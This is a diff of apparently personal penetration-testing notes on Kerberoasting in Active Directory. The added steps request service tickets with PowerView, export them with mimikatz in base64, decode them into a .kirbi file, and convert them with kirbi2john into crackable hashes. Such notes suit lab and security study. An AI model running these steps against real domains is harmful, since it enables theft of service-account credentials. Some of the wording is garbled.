@@ -103,8 +103,19 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\domai
 mimikatz # base64 /out:true
 mimikatz # kerberos::list /export 
 ```
-If we extract only `.kirbi` files and this will happen if we run `mimikatz` automatically without `base64 /out:true` 
-##### ---> On kali <---
+![image](https://github.com/user-attachments/assets/58836069-668b-4940-ae27-bd44fe3b0c53)
+- Preparing the Base64 Blob for Cracking
+```shell
+echo "<base64 blob>" |  tr -d \\n
+```
+- Placing the Output into a File as .kirbi
+```shell
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+Now we have `.kirbi` files
+**NOTE**: If we extract only `.kirbi` files and this will happen if we run `mimikatz` automatically without `base64 /out:true` 
+##### ---> On kali with `.kirbi`file
 #### Extract Hashes from `.kirbi` Tickets
 ``` shell
 python3 kirbi2john.py ticket.kirbi > hash.txt
